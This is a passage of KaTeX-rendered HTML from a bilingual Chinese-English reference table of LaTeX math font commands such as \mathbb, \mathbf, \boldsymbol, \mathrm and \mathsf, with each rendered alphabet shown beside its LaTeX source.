style="text-align:left">\mathbb{JKLMNOPQR}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="double-struck">S</mi><mi mathvariant="double-struck">T</mi><mi mathvariant="double-struck">U</mi><mi mathvariant="double-struck">V</mi><mi mathvariant="double-struck">W</mi><mi mathvariant="double-struck">X</mi><mi mathvariant="double-struck">Y</mi><mi mathvariant="double-struck">Z</mi></mrow><annotation encoding="application/x-tex">\mathbb{STUVWXYZ}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68889em;vertical-align:0em;"></span><span class="mord"><span class="mord mathbb">S</span><span class="mord mathbb">T</span><span class="mord mathbb">U</span><span class="mord mathbb">V</span><span class="mord mathbb">W</span><span class="mord mathbb">X</span><span class="mord mathbb">Y</span><span class="mord mathbb">Z</span></span></span></span></span></td><td style="text-align:left">\mathbb{STUVWXYZ}</td></tr><tr><td style="text-align:left">粗体 Boldface</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold">A</mi><mi mathvariant="bold">B</mi><mi mathvariant="bold">C</mi><mi mathvariant="bold">D</mi><mi mathvariant="bold">E</mi><mi mathvariant="bold">F</mi><mi mathvariant="bold">G</mi><mi mathvariant="bold">H</mi><mi mathvariant="bold">I</mi></mrow><annotation encoding="application/x-tex">\mathbf{ABCDEFGHI}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68611em;vertical-align:0em;"></span><span class="mord"><span class="mord mathbf">A</span><span class="mord mathbf">B</span><span class="mord mathbf">C</span><span class="mord mathbf">D</span><span class="mord mathbf">E</span><span class="mord mathbf">F</span><span class="mord mathbf">G</span><span class="mord mathbf">H</span><span class="mord mathbf">I</span></span></span></span></span></td><td style="text-align:left">\mathbf{ABCDEFGHI}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold">J</mi><mi mathvariant="bold">K</mi><mi mathvariant="bold">L</mi><mi mathvariant="bold">M</mi><mi mathvariant="bold">N</mi><mi mathvariant="bold">O</mi><mi mathvariant="bold">P</mi><mi mathvariant="bold">Q</mi><mi mathvariant="bold">R</mi></mrow><annotation encoding="application/x-tex">\mathbf{JKLMNOPQR}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8805499999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathbf">J</span><span class="mord mathbf">K</span><span class="mord mathbf">L</span><span class="mord mathbf">M</span><span class="mord mathbf">N</span><span class="mord mathbf">O</span><span class="mord mathbf">P</span><span class="mord mathbf">Q</span><span class="mord mathbf">R</span></span></span></span></span></td><td style="text-align:left">\mathbf{JKLMNOPQR}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold">S</mi><mi mathvariant="bold">T</mi><mi mathvariant="bold">U</mi><mi mathvariant="bold">V</mi><mi mathvariant="bold">W</mi><mi mathvariant="bold">X</mi><mi mathvariant="bold">Y</mi><mi mathvariant="bold">Z</mi></mrow><annotation encoding="application/x-tex">\mathbf{STUVWXYZ}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68611em;vertical-align:0em;"></span><span class="mord"><span class="mord mathbf">S</span><span class="mord mathbf">T</span><span class="mord mathbf">U</span><span class="mord mathbf" style="margin-right:0.01597em;">V</span><span class="mord mathbf" style="margin-right:0.01597em;">W</span><span class="mord mathbf">X</span><span class="mord mathbf" style="margin-right:0.02875em;">Y</span><span class="mord mathbf">Z</span></span></span></span></span></td><td style="text-align:left">\mathbf{STUVWXYZ}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold">a</mi><mi mathvariant="bold">b</mi><mi mathvariant="bold">c</mi><mi mathvariant="bold">d</mi><mi mathvariant="bold">e</mi><mi mathvariant="bold">f</mi><mi mathvariant="bold">g</mi><mi mathvariant="bold">h</mi><mi mathvariant="bold">i</mi><mi mathvariant="bold">j</mi><mi mathvariant="bold">k</mi><mi mathvariant="bold">l</mi><mi mathvariant="bold">m</mi></mrow><annotation encoding="application/x-tex">\mathbf{abcdefghijklm}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathbf">a</span><span class="mord mathbf">b</span><span class="mord mathbf">c</span><span class="mord mathbf">d</span><span class="mord mathbf">e</span><span class="mord mathbf" style="margin-right:0.10903em;">f</span><span class="mord mathbf" style="margin-right:0.01597em;">g</span><span class="mord mathbf">h</span><span class="mord mathbf">i</span><span class="mord mathbf">j</span><span class="mord mathbf">k</span><span class="mord mathbf">l</span><span class="mord mathbf">m</span></span></span></span></span></td><td style="text-align:left">\mathbf{abcdefghijklm}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold">n</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">p</mi><mi mathvariant="bold">q</mi><mi mathvariant="bold">r</mi><mi mathvariant="bold">s</mi><mi mathvariant="bold">t</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">v</mi><mi mathvariant="bold">w</mi><mi mathvariant="bold">x</mi><mi mathvariant="bold">y</mi><mi mathvariant="bold">z</mi></mrow><annotation encoding="application/x-tex">\mathbf{nopqrstuvwxyz}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8293600000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathbf">n</span><span class="mord mathbf">o</span><span class="mord mathbf">p</span><span class="mord mathbf">q</span><span class="mord mathbf">r</span><span class="mord mathbf">s</span><span class="mord mathbf">t</span><span class="mord mathbf">u</span><span class="mord mathbf" style="margin-right:0.01597em;">v</span><span class="mord mathbf" style="margin-right:0.01597em;">w</span><span class="mord mathbf">x</span><span class="mord mathbf" style="margin-right:0.01597em;">y</span><span class="mord mathbf">z</span></span></span></span></span></td><td style="text-align:left">\mathbf{nopqrstuvwxyz}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn mathvariant="bold">0123456789</mn></mrow><annotation encoding="application/x-tex">\mathbf{0123456789}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathbf">0</span><span class="mord mathbf">1</span><span class="mord mathbf">2</span><span class="mord mathbf">3</span><span class="mord mathbf">4</span><span class="mord mathbf">5</span><span class="mord mathbf">6</span><span class="mord mathbf">7</span><span class="mord mathbf">8</span><span class="mord mathbf">9</span></span></span></span></span></td><td style="text-align:left">\mathbf{0123456789}</td></tr><tr><td style="text-align:left">粗体希腊字母 Boldface (Greek)</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi><mrow><mi mathvariant="normal">A</mi><mi mathvariant="normal">B</mi><mi mathvariant="bold">Γ</mi><mi mathvariant="bold">Δ</mi><mi mathvariant="normal">E</mi><mi mathvariant="normal">Z</mi><mi mathvariant="normal">H</mi><mi mathvariant="bold">Θ</mi></mrow></mi></mrow><annotation encoding="application/x-tex">\boldsymbol{\mathrm{A} \mathrm{B} \Gamma \Delta \mathrm{E} \mathrm{Z} \mathrm{H} \Theta}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68611em;vertical-align:0em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathrm">A</span></span><span class="mord"><span class="mord mathrm">B</span></span><span class="mord mathbf">Γ</span><span class="mord mathbf">Δ</span><span class="mord"><span class="mord mathrm">E</span></span><span class="mord"><span class="mord mathrm">Z</span></span><span class="mord"><span class="mord mathrm">H</span></span><span class="mord mathbf">Θ</span></span></span></span></span></span></td><td style="text-align:left">\boldsymbol{\mathrm{A} \mathrm{B} \Gamma \Delta \mathrm{E} \mathrm{Z} \mathrm{H} \Theta}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi><mrow><mi mathvariant="normal">I</mi><mi mathvariant="normal">K</mi><mi mathvariant="bold">Λ</mi><mi mathvariant="normal">M</mi><mi mathvariant="normal">N</mi><mi mathvariant="bold">Ξ</mi><mi mathvariant="normal">O</mi><mi mathvariant="bold">Π</mi></mrow></mi></mrow><annotation encoding="application/x-tex">\boldsymbol{\mathrm{I} \mathrm{K} \Lambda \mathrm{M} \mathrm{N} \Xi \mathrm{O} \Pi}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68611em;vertical-align:0em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathrm">I</span></span><span class="mord"><span class="mord mathrm">K</span></span><span class="mord mathbf">Λ</span><span class="mord"><span class="mord mathrm">M</span></span><span class="mord"><span class="mord mathrm">N</span></span><span class="mord mathbf">Ξ</span><span class="mord"><span class="mord mathrm">O</span></span><span class="mord mathbf">Π</span></span></span></span></span></span></td><td style="text-align:left">\boldsymbol{\mathrm{I} \mathrm{K} \Lambda \mathrm{M} \mathrm{N} \Xi \mathrm{O} \Pi}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi><mrow><mi mathvariant="normal">R</mi><mi mathvariant="bold">Σ</mi><mi mathvariant="normal">T</mi><mi mathvariant="bold">Υ</mi><mi mathvariant="bold">Φ</mi><mi mathvariant="normal">X</mi><mi mathvariant="bold">Ψ</mi><mi mathvariant="bold">Ω</mi></mrow></mi></mrow><annotation encoding="application/x-tex">\boldsymbol{\mathrm{R} \Sigma \mathrm{T} \Upsilon \Phi \mathrm{X} \Psi \Omega}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68611em;vertical-align:0em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathrm">R</span></span><span class="mord mathbf">Σ</span><span class="mord"><span class="mord mathrm">T</span></span><span class="mord mathbf">Υ</span><span class="mord mathbf">Φ</span><span class="mord"><span class="mord mathrm">X</span></span><span class="mord mathbf">Ψ</span><span class="mord mathbf">Ω</span></span></span></span></span></span></td><td style="text-align:left">\boldsymbol{\mathrm{R} \Sigma \mathrm{T} \Upsilon \Phi \mathrm{X} \Psi \Omega}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi><mrow><mi mathvariant="bold-italic">α</mi><mtext mathvariant="bold"> </mtext><mi mathvariant="bold-italic">β</mi><mtext mathvariant="bold"> </mtext><mi mathvariant="bold-italic">γ</mi><mtext mathvariant="bold"> </mtext><mi mathvariant="bold-italic">δ</mi><mtext mathvariant="bold"> </mtext><mi mathvariant="bold-italic">ϵ</mi><mtext mathvariant="bold"> </mtext><mi mathvariant="bold-italic">ζ</mi><mtext mathvariant="bold"> </mtext><mi mathvariant="bold-italic">η</mi><mtext mathvariant="bold"> </mtext><mi mathvariant="bold-italic">θ</mi></mrow></mi></mrow><annotation encoding="application/x-tex">\boldsymbol{\alpha \beta \gamma \delta \epsilon \zeta \eta \theta}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord boldsymbol">α</span><span class="mord mathbf"> </span><span class="mord boldsymbol" style="margin-right:0.03403em;">β</span><span class="mord mathbf"> </span><span class="mord boldsymbol" style="margin-right:0.06389em;">γ</span><span class="mord mathbf"> </span><span class="mord boldsymbol" style="margin-right:0.03819em;">δ</span><span class="mord mathbf"> </span><span class="mord boldsymbol">ϵ</span><span class="mord mathbf"> </span><span class="mord boldsymbol" style="margin-right:0.06215em;">ζ</span><span class="mord mathbf"> </span><span class="mord boldsymbol" style="margin-right:0.03704em;">η</span><span class="mord mathbf"> </span><span class="mord boldsymbol" style="margin-right:0.03194em;">θ</span></span></span></span></span></span></td><td style="text-align:left">\boldsymbol{\alpha \beta \gamma \delta \epsilon \zeta \eta \theta}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi><mrow><mi mathvariant="bold-italic">ι</mi><mtext mathvariant="bold"> </mtext><mi mathvariant="bold-italic">κ</mi><mtext mathvariant="bold"> </mtext><mi mathvariant="bold-italic">λ</mi><mtext mathvariant="bold"> </mtext><mi mathvariant="bold-italic">μ</mi><mtext mathvariant="bold"> </mtext><mi mathvariant="bold-italic">ν</mi><mtext mathvariant="bold"> </mtext><mi mathvariant="bold-italic">ξ</mi><mtext mathvariant="bold"> </mtext><mi mathvariant="bold-italic">ο</mi><mtext mathvariant="bold"> </mtext><mi mathvariant="bold-italic">π</mi></mrow></mi></mrow><annotation encoding="application/x-tex">\boldsymbol{\iota \kappa \lambda \mu \nu \xi \omicron \pi}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord boldsymbol">ι</span><span class="mord mathbf"> </span><span class="mord boldsymbol">κ</span><span class="mord mathbf"> </span><span class="mord boldsymbol">λ</span><span class="mord mathbf"> </span><span class="mord boldsymbol">μ</span><span class="mord mathbf"> </span><span class="mord boldsymbol" style="margin-right:0.06898em;">ν</span><span class="mord mathbf"> </span><span class="mord boldsymbol" style="margin-right:0.03021em;">ξ</span><span class="mord mathbf"> </span><span class="mord boldsymbol">ο</span><span class="mord mathbf"> </span><span class="mord boldsymbol" style="margin-right:0.03704em;">π</span></span></span></span></span></span></td><td style="text-align:left">\boldsymbol{\iota \kappa \lambda \mu \nu \xi \omicron \pi}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi><mrow><mi mathvariant="bold-italic">ρ</mi><mtext mathvariant="bold"> </mtext><mi mathvariant="bold-italic">σ</mi><mtext mathvariant="bold"> </mtext><mi mathvariant="bold-italic">τ</mi><mtext mathvariant="bold"> </mtext><mi mathvariant="bold-italic">υ</mi><mtext mathvariant="bold"> </mtext><mi mathvariant="bold-italic">ϕ</mi><mtext mathvariant="bold"> </mtext><mi mathvariant="bold-italic">χ</mi><mtext mathvariant="bold"> </mtext><mi mathvariant="bold-italic">ψ</mi><mtext mathvariant="bold"> </mtext><mi mathvariant="bold-italic">ω</mi></mrow></mi></mrow><annotation encoding="application/x-tex">\boldsymbol{\rho \sigma \tau \upsilon \phi \chi \psi \omega}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord boldsymbol">ρ</span><span class="mord mathbf"> </span><span class="mord boldsymbol" style="margin-right:0.03704em;">σ</span><span class="mord mathbf"> </span><span class="mord boldsymbol" style="margin-right:0.13472em;">τ</span><span class="mord mathbf"> </span><span class="mord boldsymbol" style="margin-right:0.03704em;">υ</span><span class="mord mathbf"> </span><span class="mord boldsymbol">ϕ</span><span class="mord mathbf"> </span><span class="mord boldsymbol">χ</span><span class="mord mathbf"> </span><span class="mord boldsymbol" style="margin-right:0.03704em;">ψ</span><span class="mord mathbf"> </span><span class="mord boldsymbol" style="margin-right:0.03704em;">ω</span></span></span></span></span></span></td><td style="text-align:left">\boldsymbol{\rho \sigma \tau \upsilon \phi \chi \psi \omega}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi><mrow><mi mathvariant="bold-italic">ε</mi><mi mathvariant="bold">ϝ</mi><mi mathvariant="bold">ϰ</mi><mi mathvariant="bold-italic">ϖ</mi></mrow></mi></mrow><annotation encoding="application/x-tex">\boldsymbol{\varepsilon\digamma\varkappa\varpi}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66334em;vertical-align:-0.08167em;"></span><span class="mord"><span class="mord"><span class="mord boldsymbol">ε</span><span class="mord amsrm">ϝ</span><span class="mord amsrm" style="margin-right:0.04028em;">ϰ</span><span class="mord boldsymbol" style="margin-right:0.03194em;">ϖ</span></span></span></span></span></span></td><td style="text-align:left">\boldsymbol{\varepsilon\digamma\varkappa\varpi}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi><mrow><mi mathvariant="bold-italic">ϱ</mi><mi mathvariant="bold-italic">ς</mi><mi mathvariant="bold-italic">ϑ</mi><mi mathvariant="bold-italic">φ</mi></mrow></mi></mrow><annotation encoding="application/x-tex">\boldsymbol{\varrho\varsigma\vartheta\varphi}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord boldsymbol">ϱ</span><span class="mord boldsymbol" style="margin-right:0.07917em;">ς</span><span class="mord boldsymbol">ϑ</span><span class="mord boldsymbol">φ</span></span></span></span></span></span></td><td style="text-align:left">\boldsymbol{\varrho\varsigma\vartheta\varphi}</td></tr><tr><td style="text-align:left">斜体 Italics (拉丁字母默认default for Latin alphabet)</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn mathvariant="italic">0123456789</mn></mrow><annotation encoding="application/x-tex">\mathit{0123456789}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathit">0</span><span class="mord mathit">1</span><span class="mord mathit">2</span><span class="mord mathit">3</span><span class="mord mathit">4</span><span class="mord mathit">5</span><span class="mord mathit">6</span><span class="mord mathit">7</span><span class="mord mathit">8</span><span class="mord mathit">9</span></span></span></span></span></td><td style="text-align:left">\mathit{0123456789}</td></tr><tr><td style="text-align:left">罗马体 Roman typeface</td><td style="text-align:left">Roman typeface</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">A</mi><mi mathvariant="normal">B</mi><mi mathvariant="normal">C</mi><mi mathvariant="normal">D</mi><mi mathvariant="normal">E</mi><mi mathvariant="normal">F</mi><mi mathvariant="normal">G</mi><mi mathvariant="normal">H</mi><mi mathvariant="normal">I</mi></mrow><annotation encoding="application/x-tex">\mathrm{ABCDEFGHI}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathrm">A</span><span class="mord mathrm">B</span><span class="mord mathrm">C</span><span class="mord mathrm">D</span><span class="mord mathrm">E</span><span class="mord mathrm">F</span><span class="mord mathrm">G</span><span class="mord mathrm">H</span><span class="mord mathrm">I</span></span></span></span></span></td><td style="text-align:left">\mathrm{ABCDEFGHI}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">J</mi><mi mathvariant="normal">K</mi><mi mathvariant="normal">L</mi><mi mathvariant="normal">M</mi><mi mathvariant="normal">N</mi><mi mathvariant="normal">O</mi><mi mathvariant="normal">P</mi><mi mathvariant="normal">Q</mi><mi mathvariant="normal">R</mi></mrow><annotation encoding="application/x-tex">\mathrm{JKLMNOPQR}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathrm">J</span><span class="mord mathrm">K</span><span class="mord mathrm">L</span><span class="mord mathrm">M</span><span class="mord mathrm">N</span><span class="mord mathrm">O</span><span class="mord mathrm">P</span><span class="mord mathrm">Q</span><span class="mord mathrm">R</span></span></span></span></span></td><td style="text-align:left">\mathrm{JKLMNOPQR}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">S</mi><mi mathvariant="normal">T</mi><mi mathvariant="normal">U</mi><mi mathvariant="normal">V</mi><mi mathvariant="normal">W</mi><mi mathvariant="normal">X</mi><mi mathvariant="normal">Y</mi><mi mathvariant="normal">Z</mi></mrow><annotation encoding="application/x-tex">\mathrm{STUVWXYZ}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathrm">S</span><span class="mord mathrm">T</span><span class="mord mathrm">U</span><span class="mord mathrm" style="margin-right:0.01389em;">V</span><span class="mord mathrm" style="margin-right:0.01389em;">W</span><span class="mord mathrm">X</span><span class="mord mathrm" style="margin-right:0.025em;">Y</span><span class="mord mathrm">Z</span></span></span></span></span></td><td style="text-align:left">\mathrm{STUVWXYZ}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">a</mi><mi mathvariant="normal">b</mi><mi mathvariant="normal">c</mi><mi mathvariant="normal">d</mi><mi mathvariant="normal">e</mi><mi mathvariant="normal">f</mi><mi mathvariant="normal">g</mi><mi mathvariant="normal">h</mi><mi mathvariant="normal">i</mi><mi mathvariant="normal">j</mi><mi mathvariant="normal">k</mi><mi mathvariant="normal">l</mi><mi mathvariant="normal">m</mi></mrow><annotation encoding="application/x-tex">\mathrm{abcdefghijklm}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathrm">a</span><span class="mord mathrm">b</span><span class="mord mathrm">c</span><span class="mord mathrm">d</span><span class="mord mathrm">e</span><span class="mord mathrm" style="margin-right:0.07778em;">f</span><span class="mord mathrm" style="margin-right:0.01389em;">g</span><span class="mord mathrm">h</span><span class="mord mathrm">i</span><span class="mord mathrm">j</span><span class="mord mathrm">k</span><span class="mord mathrm">l</span><span class="mord mathrm">m</span></span></span></span></span></td><td style="text-align:left">\mathrm{abcdefghijklm}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">n</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">p</mi><mi mathvariant="normal">q</mi><mi mathvariant="normal">r</mi><mi mathvariant="normal">s</mi><mi mathvariant="normal">t</mi><mi mathvariant="normal">u</mi><mi mathvariant="normal">v</mi><mi mathvariant="normal">w</mi><mi mathvariant="normal">x</mi><mi mathvariant="normal">y</mi><mi mathvariant="normal">z</mi></mrow><annotation encoding="application/x-tex">\mathrm{nopqrstuvwxyz}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathrm">n</span><span class="mord mathrm">o</span><span class="mord mathrm">p</span><span class="mord mathrm">q</span><span class="mord mathrm">r</span><span class="mord mathrm">s</span><span class="mord mathrm">t</span><span class="mord mathrm">u</span><span class="mord mathrm" style="margin-right:0.01389em;">v</span><span class="mord mathrm" style="margin-right:0.01389em;">w</span><span class="mord mathrm">x</span><span class="mord mathrm" style="margin-right:0.01389em;">y</span><span class="mord mathrm">z</span></span></span></span></span></td><td style="text-align:left">\mathrm{nopqrstuvwxyz}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0123456789</mn></mrow><annotation encoding="application/x-tex">\mathrm{0123456789}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathrm">0</span><span class="mord mathrm">1</span><span class="mord mathrm">2</span><span class="mord mathrm">3</span><span class="mord mathrm">4</span><span class="mord mathrm">5</span><span class="mord mathrm">6</span><span class="mord mathrm">7</span><span class="mord mathrm">8</span><span class="mord mathrm">9</span></span></span></span></span></td><td style="text-align:left">\mathrm{0123456789}</td></tr><tr><td style="text-align:left">无衬线体 Sans serif</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="sans-serif">A</mi><mi mathvariant="sans-serif">B</mi><mi mathvariant="sans-serif">C</mi><mi mathvariant="sans-serif">D</mi><mi mathvariant="sans-serif">E</mi><mi mathvariant="sans-serif">F</mi><mi mathvariant="sans-serif">G</mi><mi mathvariant="sans-serif">H</mi><mi mathvariant="sans-serif">I</mi></mrow><annotation encoding="application/x-tex">\mathsf{ABCDEFGHI}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathsf">A</span><span class="mord mathsf">B</span><span class="mord mathsf">C</span><span class="mord mathsf">D</span><span class="mord mathsf">E</span><span class="mord mathsf">F</span><span class="mord mathsf">G</span><span class="mord mathsf">H</span><span class="mord mathsf">I</span></span></span></span></span></td><td style="text-align:left">\mathsf{ABCDEFGHI}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="sans-serif">J</mi><mi mathvariant="sans-serif">K</mi><mi mathvariant="sans-serif">L</mi><mi mathvariant="sans-serif">M</mi><mi mathvariant="sans-serif">N</mi><mi mathvariant="sans-serif">O</mi><mi mathvariant="sans-serif">P</mi><mi mathvariant="sans-serif">Q</mi><mi mathvariant="sans-serif">R</mi></mrow><annotation encoding="application/x-tex">\mathsf{JKLMNOPQR}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.81944em;vertical-align:-0.125em;"></span><span class="mord"><span class="mord mathsf">J</span><span class="mord mathsf">K</span><span class="mord mathsf">L</span><span class="mord mathsf">M</span><span class="mord mathsf">N</span><span class="mord mathsf">O</span><span class="mord mathsf">P</span><span class="mord mathsf">Q</span><span class="mord mathsf">R</span></span></span></span></span></td><td style="text-align:left">\mathsf{JKLMNOPQR}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="sans-serif">S</mi><mi mathvariant="sans-serif">T</mi><mi mathvariant="sans-serif">U</mi><mi mathvariant="sans-serif">V</mi><mi mathvariant="sans-serif">W</mi><mi mathvariant="sans-serif">X</mi><mi mathvariant="sans-serif">Y</mi><mi mathvariant="sans-serif">Z</mi></mrow><annotation encoding="application/x-tex">\mathsf{STUVWXYZ}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathsf">S</span><span class="mord mathsf">T</span><span class="mord mathsf">U</span><span class="mord mathsf" style="margin-right:0.01389em;">V</span><span class="mord mathsf" style="margin-right:0.01389em;">W</span><span class="mord mathsf">X</span><span class="mord mathsf" style="margin-right:0.025em;">Y</span><span class="mord mathsf">Z</span></span></span></span></span></td><td style="text-align:left">\mathsf{STUVWXYZ}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="sans-serif">a</mi><mi mathvariant="sans-serif">b</mi><mi mathvariant="sans-serif">c</mi><mi mathvariant="sans-serif">d</mi><mi mathvariant="sans-serif">e</mi><mi mathvariant="sans-serif">f</mi><mi mathvariant="sans-serif">g</mi><mi mathvariant="sans-serif">h</mi><mi mathvariant="sans-serif">i</mi><mi mathvariant="sans-serif">j</mi><mi mathvariant="sans-serif">k</mi><mi mathvariant="sans-serif">l</mi><mi mathvariant="sans-serif">m</mi></mrow><annotation encoding="application/x-tex">\mathsf{abcdefghijklm}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathsf">a</span><span class="mord mathsf">b</span><span class="mord mathsf">c</span><span class="mord mathsf">d</span><span class="mord mathsf">e</span><span class="mord mathsf" style="margin-right:0.06944em;">f</span><span class="mord mathsf" style="margin-right:0.01389em;">g</span><span class="mord mathsf">h</span><span class="mord mathsf">i</span><span class="mord mathsf">j</span><span class="mord mathsf">k</span><span class="mord mathsf">l</span><span class="mord mathsf">m</span></span></span></span></span></td><td style="text-align:left">\mathsf{abcdefghijklm}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="sans-serif">n</mi><mi 